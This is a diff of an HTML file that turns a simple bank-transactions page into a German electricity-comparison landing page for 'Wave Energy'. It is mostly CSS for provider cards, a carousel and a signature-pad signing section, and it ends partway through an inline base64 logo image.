@@ -1,156 +1,1663 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bank Transactions</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>Stromvergleich 2026 – Wave Energy</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
-body { font-family: Inter, sans-serif; margin:0; background:#582d7d; color:#e6eef8; }
-.wrap { max-width:420px; margin:0 auto; padding:16px; }
-.logo { display:block; width:160px; margin:0 auto 20px; }
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-.card { 
-    background:#3d1f5e;
-    border-radius:14px; 
-    padding:16px; 
-    margin-bottom:16px; 
-    box-shadow:0 4px 12px rgba(0,0,0,0.5); 
+:root {
+--brand: #451DC7;
+--brand-light: #EAE5FD;
+--accent: #04F06A;
+--accent-dark: #02A048;
+--accent-light: #CAFEE0;
+--white: #ffffff;
+--gray-50: #f8f8fb;
+--gray-100: #f0f0f5;
+--gray-200: #e2e2ec;
+--gray-400: #aaa;
+--gray-500: #888;
+--gray-700: #444;
+--shadow-sm: 0 1px 4px rgba(69,29,199,0.07);
+--shadow-md: 0 6px 24px rgba(69,29,199,0.13);
+--shadow-lg: 0 12px 40px rgba(69,29,199,0.18);
+--radius-sm: 10px;
+--radius-md: 14px;
+--radius-lg: 20px;
 }
 
-.user-info { text-align:center; }
-.user-info h2 { margin:0; font-size:20px; }
-.user-info p { margin:6px 0 0; color:#cfcfd1; font-size:14px; }
+html { scroll-behavior: smooth; }
 
-.transaction-list { list-style:none; padding:0; margin:0; }
-.transaction-item { 
-    display:flex; align-items:center; justify-content:space-between; 
-    padding:12px 0; 
-    border-bottom:1px solid rgba(255,255,255,0.08); 
+body {
+font-family: 'DM Sans', sans-serif;
+background: #f2f1f8;
+color: #111;
+line-height: 1.5;
+min-height: 100vh;
+overflow-x: hidden;
+-webkit-text-size-adjust: 100%;
 }
-.transaction-item img { 
-    width:32px; height:32px; margin-right:12px; border-radius:6px; 
-    background:white; padding:4px; 
-}
-.transaction-info { display:flex; align-items:center; gap:8px; }
-.transaction-name { font-size:15px; }
-.transaction-category { font-size:12px; color:#cfcfd1; }
-.transaction-date { font-size:12px; color:#cfcfd1; }
-.transaction-amount { font-weight:600; }
 
-.meta { display:flex; justify-content:space-between; margin-top:8px; font-size:12px; color:#cfcfd1; }
-.btn { 
-    background:transparent; 
-    border:1px solid rgba(255,255,255,0.12); 
-    padding:6px 10px; 
-    border-radius:10px; 
-    color:#cfcfd1; font-size:13px; 
-    cursor:pointer; 
+/* ===== NAV / TOP BAR ===== */
+.topbar {
+background: var(--white);
+border-bottom: 1px solid var(--gray-200);
+padding: 12px 16px;
+display: flex;
+align-items: center;
+justify-content: center;
+position: sticky;
+top: 0;
+z-index: 100;
+box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+}
+.topbar-logo {
+display: flex;
+align-items: center;
+gap: 10px;
+}
+.topbar-logo img {
+height: 32px;
+width: auto;
+}
+.topbar-name {
+font-family: 'Sora', sans-serif;
+font-size: 17px;
+font-weight: 800;
+color: var(--brand);
+letter-spacing: -0.5px;
+}
+
+/* ===== LAYOUT ===== */
+.section {
+padding: 16px 12px 28px;
+width: 100%;
+margin: 0 auto;
+}
+@media (min-width: 480px) {
+.section {
+max-width: 540px;
+padding: 24px 16px 36px;
+}
+}
+
+/* ===== HERO ===== */
+.hero {
+text-align: center;
+margin-bottom: 16px;
+}
+.hero-badge {
+display: inline-flex;
+align-items: center;
+gap: 5px;
+background: var(--brand);
+color: #fff;
+font-family: 'Sora', sans-serif;
+font-size: 9px;
+font-weight: 700;
+letter-spacing: 0.08em;
+text-transform: uppercase;
+padding: 4px 10px;
+border-radius: 16px;
+margin-bottom: 10px;
+}
+.hero-badge::before { content: "⚡"; }
+.hero h1 {
+font-family: 'Sora', sans-serif;
+font-size: clamp(17px, 5vw, 24px);
+font-weight: 800;
+color: #0d0d1a;
+margin-bottom: 6px;
+line-height: 1.2;
+letter-spacing: -0.5px;
+}
+.hero p {
+font-size: 12px;
+color: var(--gray-500);
+}
+
+/* ===== PARAMS BAR ===== */
+.params-bar {
+display: flex;
+gap: 5px;
+flex-wrap: wrap;
+justify-content: center;
+margin-bottom: 16px;
+}
+.param-chip {
+background: var(--white);
+border: 1px solid var(--gray-200);
+border-radius: 14px;
+padding: 4px 9px;
+font-size: 10px;
+color: var(--gray-500);
+display: flex;
+align-items: center;
+gap: 4px;
+box-shadow: var(--shadow-sm);
+}
+.param-chip strong { color: #000; font-weight: 600; }
+
+/* ===== SAVINGS BANNER ===== */
+.savings-banner {
+background: linear-gradient(135deg, var(--brand) 0%, #6b3de8 100%);
+border-radius: var(--radius-md);
+padding: 12px 14px;
+color: white;
+text-align: center;
+margin-bottom: 16px;
+box-shadow: var(--shadow-md);
+}
+.savings-banner .s-label {
+font-size: 9px;
+opacity: 0.8;
+text-transform: uppercase;
+letter-spacing: 0.07em;
+margin-bottom: 3px;
+}
+.savings-banner .s-amount {
+font-family: 'Sora', sans-serif;
+font-size: 24px;
+font-weight: 800;
+letter-spacing: -1px;
+}
+.savings-banner .s-sub {
+font-size: 10px;
+opacity: 0.75;
+margin-top: 3px;
+}
+
+/* ===== PROVIDER SELECTOR TABS ===== */
+.provider-selector {
+display: flex;
+gap: 8px;
+margin-bottom: 14px;
+width: 100%;
+}
+.provider-tab {
+flex: 1;
+min-width: 0;
+display: flex;
+align-items: center;
+gap: 6px;
+padding: 10px 8px;
+background: var(--white);
+border: 2px solid var(--gray-200);
+border-radius: var(--radius-md);
+cursor: pointer;
+transition: all 0.25s ease;
+box-shadow: var(--shadow-sm);
+}
+.provider-tab:hover {
+border-color: var(--brand-light);
+box-shadow: var(--shadow-md);
+}
+.provider-tab.active {
+border-color: var(--brand);
+background: linear-gradient(135deg, var(--brand-light) 0%, #f5f2ff 100%);
+box-shadow: 0 4px 16px rgba(69,29,199,0.2);
+}
+.provider-tab-logo {
+width: 36px;
+height: 36px;
+border-radius: 9px;
+display: flex;
+align-items: center;
+justify-content: center;
+flex-shrink: 0;
+overflow: hidden;
+}
+.provider-tab-logo.wave { background: var(--brand-light); }
+.provider-tab-logo.volt { background: #E8F4FF; }
+.provider-tab-logo img {
+width: 28px;
+height: 28px;
+object-fit: contain;
+}
+.provider-tab-logo svg {
+width: 24px;
+height: 24px;
+}
+.provider-tab-info {
+flex: 1;
+min-width: 0;
+}
+.provider-tab-name {
+font-family: 'Sora', sans-serif;
+font-size: 11px;
+font-weight: 700;
+color: #0d0d1a;
+white-space: nowrap;
+overflow: hidden;
+text-overflow: ellipsis;
+}
+.provider-tab-sub {
+font-size: 9px;
+color: var(--gray-500);
+margin-top: 1px;
+white-space: nowrap;
+overflow: hidden;
+text-overflow: ellipsis;
+}
+.provider-tab-price {
+text-align: right;
+flex-shrink: 0;
+padding-left: 4px;
+}
+.provider-tab-price-main {
+font-family: 'Sora', sans-serif;
+font-size: 12px;
+font-weight: 800;
+color: #0d0d1a;
+line-height: 1.1;
+}
+.provider-tab-price-sub {
+font-size: 8px;
+color: var(--gray-400);
+}
+.provider-tab.active .provider-tab-name {
+color: var(--brand);
+}
+.provider-tab.recommended {
+position: relative;
+}
+.provider-tab.recommended::after {
+content: "★";
+position: absolute;
+top: -5px;
+right: 6px;
+background: var(--accent);
+color: var(--accent-dark);
+font-size: 9px;
+font-weight: 700;
+padding: 1px 5px;
+border-radius: 6px;
+}
+
+/* ===== CAROUSEL WRAPPER ===== */
+.carousel-wrapper {
+position: relative;
+margin-bottom: 20px;
+width: 100%;
+}
+.carousel-container {
+display: flex;
+overflow-x: auto;
+scroll-snap-type: x mandatory;
+scroll-behavior: smooth;
+-webkit-overflow-scrolling: touch;
+scrollbar-width: none;
+padding: 0;
+width: 100%;
+}
+.carousel-container::-webkit-scrollbar {
+display: none;
+}
+.carousel-track {
+display: flex;
+width: 100%;
+}
+.carousel-slide {
+flex: 0 0 100%;
+scroll-snap-align: center;
+width: 100%;
+padding: 0 12px;
+}
+@media (min-width: 480px) {
+.carousel-slide {
+flex: 0 0 calc(50% - 6px);
+width: calc(50% - 6px);
+padding: 0;
+}
+.carousel-container {
+gap: 12px;
+padding: 0 6px;
+}
+}
+
+/* Carousel Navigation Dots */
+.carousel-dots {
+display: flex;
+justify-content: center;
+gap: 8px;
+margin-top: 10px;
+}
+.carousel-dot {
+width: 7px;
+height: 7px;
+border-radius: 50%;
+background: var(--gray-200);
+border: none;
+cursor: pointer;
+transition: all 0.2s ease;
+}
+.carousel-dot.active {
+background: var(--brand);
+width: 20px;
+border-radius: 4px;
+}
+
+/* Carousel Navigation Arrows */
+.carousel-nav {
+position: absolute;
+top: 50%;
+transform: translateY(-50%);
+width: 28px;
+height: 28px;
+border-radius: 50%;
+background: var(--white);
+border: 1px solid var(--gray-200);
+box-shadow: var(--shadow-md);
+cursor: pointer;
+display: flex;
+align-items: center;
+justify-content: center;
+font-size: 14px;
+color: var(--brand);
+z-index: 10;
+transition: all 0.2s ease;
+}
+.carousel-nav:hover {
+background: var(--brand);
+color: var(--white);
+}
+.carousel-nav.prev { left: 0; }
+.carousel-nav.next { right: 0; }
+.carousel-nav:disabled {
+opacity: 0.3;
+cursor: not-allowed;
+}
+@media (max-width: 480px) {
+.carousel-nav {
+display: none;
+}
+}
+
+/* ===== CARDS ===== */
+.card {
+background: var(--white);
+border: 1.5px solid var(--gray-200);
+border-radius: var(--radius-lg);
+overflow: hidden;
+box-shadow: var(--shadow-sm);
+height: 100%;
+width: 100%;
+}
+.card.featured {
+border: 2px solid var(--brand);
+box-shadow: var(--shadow-md);
+}
+
+/* --- Card Head --- */
+.card-head {
+padding: 12px 14px 10px;
+border-bottom: 1px solid var(--gray-100);
+background: var(--white);
+}
+@media (min-width: 480px) {
+.card-head {
+padding: 14px 16px 12px;
+}
+}
+.card-head-top {
+display: flex;
+align-items: center;
+justify-content: space-between;
+margin-bottom: 8px;
+}
+.logo-box {
+width: 38px;
+height: 38px;
+border-radius: 10px;
+display: flex;
+align-items: center;
+justify-content: center;
+flex-shrink: 0;
+overflow: hidden;
+}
+@media (min-width: 480px) {
+.logo-box {
+width: 42px;
+height: 42px;
+}
+}
+.logo-wave { background: var(--brand-light); }
+.logo-volt { background: #E8F4FF; }
+.logo-box img { width: 30px; height: 30px; object-fit: contain; }
+@media (min-width: 480px) {
+.logo-box img { width: 34px; height: 34px; }
+}
+
+.badge-top {
+font-family: 'Sora', sans-serif;
+font-size: 8px;
+font-weight: 700;
+letter-spacing: 0.05em;
+padding: 3px 8px;
+border-radius: 10px;
+flex-shrink: 0;
+}
+@media (min-width: 480px) {
+.badge-top {
+font-size: 9px;
+padding: 4px 10px;
+}
+}
+.badge-recommend { background: var(--accent); color: var(--accent-dark); }
+.badge-standard { background: var(--gray-100); color: var(--gray-500); border: 1px solid var(--gray-200); }
+
+.card-name {
+font-family: 'Sora', sans-serif;
+font-size: 15px;
+font-weight: 800;
+color: #0d0d1a;
+}
+@media (min-width: 480px) {
+.card-name {
+font-size: 17px;
+}
+}
+.card-sub { font-size: 10px; color: var(--gray-500); margin-top: 2px; }
+@media (min-width: 480px) {
+.card-sub { font-size: 11px; }
+}
+
+/* --- Price Block --- */
+.price-block {
+padding: 10px 14px;
+background: var(--gray-50);
+border-bottom: 1px solid var(--gray-100);
+}
+@media (min-width: 480px) {
+.price-block {
+padding: 12px 16px;
+}
+}
+.price-label {
+font-size: 8px;
+color: var(--gray-500);
+text-transform: uppercase;
+letter-spacing: 0.07em;
+margin-bottom: 3px;
+}
+.price-main {
+font-family: 'Sora', sans-serif;
+font-size: 22px;
+font-weight: 800;
+line-height: 1;
+color: #0d0d1a;
+}
+@media (min-width: 480px) {
+.price-main {
+font-size: 26px;
+}
+}
+.price-main span {
+font-size: 11px;
+font-weight: 400;
+color: var(--gray-500);
+}
+.price-higher { color: #2563eb; }
+.price-sub { font-size: 9px; color: var(--gray-400); margin-top: 4px; }
+
+/* --- Rows --- */
+.rows { padding: 3px 0; }
+.row {
+display: flex;
+align-items: center;
+gap: 8px;
+padding: 8px 14px;
+border-bottom: 1px solid var(--gray-100);
+}
+@media (min-width: 480px) {
+.row {
+padding: 9px 16px;
+}
+}
+.row:last-child { border-bottom: none; }
+
+.row-icon {
+width: 18px;
+height: 18px;
+border-radius: 5px;
+display: flex;
+align-items: center;
+justify-content: center;
+flex-shrink: 0;
+font-size: 10px;
+}
+@media (min-width: 480px) {
+.row-icon {
+width: 20px;
+height: 20px;
+font-size: 11px;
+}
+}
+.row-icon-green { background: var(--accent-light); }
+.row-icon-gray { background: var(--gray-100); }
+.row-icon-bonus { background: #FFF3E0; }
+
+.row-label { font-size: 11px; color: var(--gray-500); flex: 1; }
+@media (min-width: 480px) {
+.row-label { font-size: 12px; }
+}
+.row-value { font-size: 11px; font-weight: 600; color: #0d0d1a; text-align: right; }
+@media (min-width: 480px) {
+.row-value { font-size: 12px; }
+}
+.row-value.better { color: var(--accent-dark); }
+.row-value.worse { color: var(--gray-400); font-weight: 400; }
+.row-value.bonus-good { color: #c05200; font-weight: 700; }
+.row-value.bonus-great { color: var(--brand); font-weight: 700; }
+
+.badge-better {
+display: inline-block;
+background: var(--accent-light);
+color: var(--accent-dark);
+font-size: 7px;
+font-weight: 700;
+padding: 1px 4px;
+border-radius: 5px;
+margin-left: 3px;
+vertical-align: middle;
+}
+
+/* --- Section divider in card --- */
+.section-divider {
+padding: 6px 14px 3px;
+font-size: 8px;
+font-weight: 700;
+text-transform: uppercase;
+letter-spacing: 0.08em;
+color: var(--gray-400);
+border-top: 1px solid var(--gray-100);
+background: var(--gray-50);
+}
+@media (min-width: 480px) {
+.section-divider {
+padding: 7px 16px 3px;
+font-size: 9px;
+}
+}
+
+/* --- Info Block --- */
+.info-block {
+padding: 10px 14px;
+background: linear-gradient(135deg, var(--brand-light) 0%, #f5f2ff 100%);
+border-top: 1px solid #d5caf5;
+}
+@media (min-width: 480px) {
+.info-block {
+padding: 12px 16px;
+}
+}
+.info-block.volt-info {
+background: linear-gradient(135deg, #e8f4ff 0%, #f0f8ff 100%);
+border-top: 1px solid #c5dff5;
+}
+.info-title {
+font-family: 'Sora', sans-serif;
+font-size: 10px;
+font-weight: 700;
+color: var(--brand);
+margin-bottom: 6px;
+}
+@media (min-width: 480px) {
+.info-title {
+font-size: 11px;
+}
+}
+.info-title.volt { color: #1565c0; }
+.info-list {
+list-style: none;
+display: flex;
+flex-direction: column;
+gap: 4px;
+}
+.info-list li {
+font-size: 10px;
+color: var(--gray-700);
+display: flex;
+align-items: flex-start;
+gap: 5px;
+line-height: 1.35;
+}
+@media (min-width: 480px) {
+.info-list li {
+font-size: 11px;
+}
+}
+.info-list li::before {
+content: "✓";
+color: var(--accent-dark);
+font-weight: 700;
+flex-shrink: 0;
+}
+.info-list.volt li::before { color: #1565c0; }
+
+/* ===== WHY WAVE SECTION ===== */
+.why-section {
+background: var(--white);
+border-radius: var(--radius-lg);
+padding: 14px;
+margin-bottom: 20px;
+box-shadow: var(--shadow-sm);
+border: 1.5px solid var(--brand-light);
+width: 100%;
+}
+@media (min-width: 480px) {
+.why-section {
+padding: 16px;
+}
+}
+.why-title {
+font-family: 'Sora', sans-serif;
+font-size: 13px;
+font-weight: 800;
+color: var(--brand);
+margin-bottom: 12px;
+display: flex;
+align-items: center;
+gap: 6px;
+}
+.why-grid {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 8px;
+}
+.why-item {
+background: var(--gray-50);
+border-radius: var(--radius-sm);
+padding: 8px;
+text-align: center;
+border: 1px solid var(--gray-200);
+}
+@media (min-width: 480px) {
+.why-item {
+padding: 10px;
+}
+}
+.why-icon { font-size: 18px; margin-bottom: 4px; }
+.why-item-title {
+font-family: 'Sora', sans-serif;
+font-size: 10px;
+font-weight: 700;
+color: #0d0d1a;
+margin-bottom: 2px;
+}
+.why-item-sub { font-size: 9px; color: var(--gray-500); line-height: 1.35; }
+
+/* ===== DISCLAIMER ===== */
+.disclaimer {
+font-size: 8px;
+color: var(--gray-400);
+text-align: center;
+line-height: 1.7;
+padding: 0 6px;
+}
+
+/* ===== HIDDEN SIGNING SECTION ===== */
+#signing-section {
+display: none;
+background: #f2f1f8;
+min-height: 100vh;
+padding-top: 20px;
+}
+#signing-section.visible { 
+display: block;
+animation: fadeIn 0.4s ease-out;
+}
+
+@keyframes fadeIn {
+from { opacity: 0; transform: translateY(10px); }
+to { opacity: 1; transform: translateY(0); }
+}
+
+.sign-hero {
+background: linear-gradient(135deg, var(--brand) 0%, #6b3de8 100%);
+padding: 20px 14px 24px;
+text-align: center;
+color: white;
+border-radius: var(--radius-lg);
+margin-bottom: 16px;
+}
+@media (min-width: 480px) {
+.sign-hero {
+padding: 24px 18px 28px;
+}
+}
+.sign-hero-logo {
+width: 44px;
+height: 44px;
+background: rgba(255,255,255,0.15);
+border-radius: 12px;
+display: flex;
+align-items: center;
+justify-content: center;
+margin: 0 auto 12px;
+overflow: hidden;
+}
+.sign-hero-logo img { width: 32px; height: 32px; object-fit: contain; }
+.sign-hero h2 {
+font-family: 'Sora', sans-serif;
+font-size: 19px;
+font-weight: 800;
+margin-bottom: 5px;
+letter-spacing: -0.5px;
+}
+@media (min-width: 480px) {
+.sign-hero h2 {
+font-size: 21px;
+}
+}
+.sign-hero p {
+font-size: 12px;
+opacity: 0.8;
+}
+
+.sign-container {
+width: 100%;
+margin: 0 auto;
+padding: 0 12px 28px;
+}
+@media (min-width: 480px) {
+.sign-container {
+max-width: 540px;
+padding: 0 16px 36px;
+}
+}
+
+.sign-card {
+background: var(--white);
+border-radius: var(--radius-lg);
+overflow: hidden;
+box-shadow: var(--shadow-md);
+margin-bottom: 12px;
+border: 1.5px solid var(--gray-200);
+}
+
+.sign-card-head {
+padding: 10px 14px;
+background: var(--gray-50);
+border-bottom: 1px solid var(--gray-200);
+font-family: 'Sora', sans-serif;
+font-size: 11px;
+font-weight: 700;
+color: var(--brand);
+display: flex;
+align-items: center;
+gap: 6px;
+}
+@media (min-width: 480px) {
+.sign-card-head {
+padding: 12px 16px;
+font-size: 12px;
+}
+}
+
+.sign-detail-row {
+display: flex;
+justify-content: space-between;
+align-items: center;
+padding: 9px 14px;
+border-bottom: 1px solid var(--gray-100);
+font-size: 11px;
+}
+@media (min-width: 480px) {
+.sign-detail-row {
+padding: 10px 16px;
+font-size: 12px;
+}
+}
+.sign-detail-row:last-child { border-bottom: none; }
+.sign-detail-label { color: var(--gray-500); }
+.sign-detail-value { font-weight: 600; color: #0d0d1a; }
+
+/* Signature pad */
+.sig-pad-wrap {
+padding: 14px;
+}
+@media (min-width: 480px) {
+.sig-pad-wrap {
+padding: 16px;
+}
+}
+.sig-instructions {
+font-size: 10px;
+color: var(--gray-500);
+text-align: center;
+margin-bottom: 8px;
+}
+.sig-canvas-container {
+position: relative;
+border: 2px dashed var(--gray-200);
+border-radius: var(--radius-sm);
+background: var(--gray-50);
+overflow: hidden;
+cursor: crosshair;
+}
+.sig-canvas-container.has-sig {
+border-color: var(--brand);
+border-style: solid;
+}
+#signatureCanvas {
+display: block;
+width: 100%;
+height: 130px;
+touch-action: none;
+}
+@media (min-width: 480px) {
+#signatureCanvas {
+height: 150px;
+}
+}
+.sig-placeholder {
+position: absolute;
+inset: 0;
+display: flex;
+align-items: center;
+justify-content: center;
+pointer-events: none;
+font-size: 11px;
+color: var(--gray-400);
+gap: 5px;
+flex-direction: column;
+}
+.sig-placeholder svg { opacity: 0.4; }
+.sig-placeholder.hidden { display: none; }
+
+.sig-actions {
+display: flex;
+gap: 6px;
+margin-top: 8px;
+}
+.btn-clear {
+flex: 0 0 auto;
+padding: 8px 12px;
+border: 1.5px solid var(--gray-200);
+border-radius: var(--radius-sm);
+background: var(--white);
+font-size: 11px;
+color: var(--gray-700);
+cursor: pointer;
+font-family: 'DM Sans', sans-serif;
+font-weight: 600;
+}
+.btn-clear:active { background: var(--gray-100); }
+
+/* Consent checkbox */
+.consent-block {
+padding: 12px 14px;
+border-top: 1px solid var(--gray-100);
+}
+.consent-label {
+display: flex;
+align-items: flex-start;
+gap: 8px;
+cursor: pointer;
+}
+.consent-label input[type="checkbox"] {
+width: 17px;
+height: 17px;
+flex-shrink: 0;
+margin-top: 1px;
+accent-color: var(--brand);
+cursor: pointer;
+}
+.consent-text {
+font-size: 10px;
+color: var(--gray-700);
+line-height: 1.45;
+}
+.consent-text a { color: var(--brand); text-decoration: underline; }
+
+/* Submit button */
+.btn-submit {
+display: block;
+width: 100%;
+padding: 13px;
+border-radius: var(--radius-md);
+font-family: 'Sora', sans-serif;
+font-size: 13px;
+font-weight: 700;
+text-align: center;
+cursor: pointer;
+border: none;
+background: var(--accent);
+color: var(--accent-dark);
+box-shadow: 0 4px 20px rgba(4,240,106,0.3);
+transition: opacity 0.2s, transform 0.1s;
+margin-top: 6px;
+}
+@media (min-width: 480px) {
+.btn-submit {
+padding: 15px;
+font-size: 14px;
+}
+}
+.btn-submit:disabled {
+opacity: 0.4;
+cursor: not-allowed;
+box-shadow: none;
+}
+.btn-submit:not(:disabled):active { transform: scale(0.98); }
+
+/* Success screen */
+.success-screen {
+display: none;
+text-align: center;
+padding: 36px 18px;
+}
+.success-screen.visible { display: block; }
+.success-icon {
+width: 58px;
+height: 58px;
+background: var(--accent-light);
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+margin: 0 auto 18px;
+font-size: 26px;
+}
+.success-screen h3 {
+font-family: 'Sora', sans-serif;
+font-size: 19px;
+font-weight: 800;
+color: #0d0d1a;
+margin-bottom: 7px;
+}
+.success-screen p {
+font-size: 12px;
+color: var(--gray-500);
+line-height: 1.55;
+}
+
+/* Loading spinner */
+.api-loader {
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 6px;
+padding: 10px;
+font-size: 10px;
+color: var(--gray-400);
+}
+.spinner {
+width: 13px;
+height: 13px;
+border: 2px solid var(--gray-200);
+border-top-color: var(--brand);
+border-radius: 50%;
+animation: spin 0.7s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* Scroll anchor indicator */
+.scroll-hint {
+display: none;
+position: fixed;
+bottom: 18px;
+left: 50%;
+transform: translateX(-50%);
+background: var(--brand);
+color: white;
+font-family: 'Sora', sans-serif;
+font-size: 11px;
+font-weight: 700;
+padding: 9px 18px;
+border-radius: 18px;
+box-shadow: var(--shadow-lg);
+cursor: pointer;
+z-index: 200;
+animation: bounce 1.5s ease infinite;
+}
+.scroll-hint.show { display: flex; align-items: center; gap: 6px; }
+@keyframes bounce {
+0%, 100% { transform: translateX(-50%) translateY(0); }
+50% { transform: translateX(-50%) translateY(-5px); }
 }
 </style>
 </head>
 <body>
-<div class="wrap">
 
-<img class="logo" src="https://raw.githubusercontent.com/javad-niroumand/Lisa/main/ChatGPT%20Image%20Nov%2025%2C%202025%2C%2002_43_24%20PM%20(1).png" alt="Bank Logo">
+<!-- ===== TOP BAR ===== -->
+<nav class="topbar">
+<div class="topbar-logo">
+<img src="data:image/png;base64,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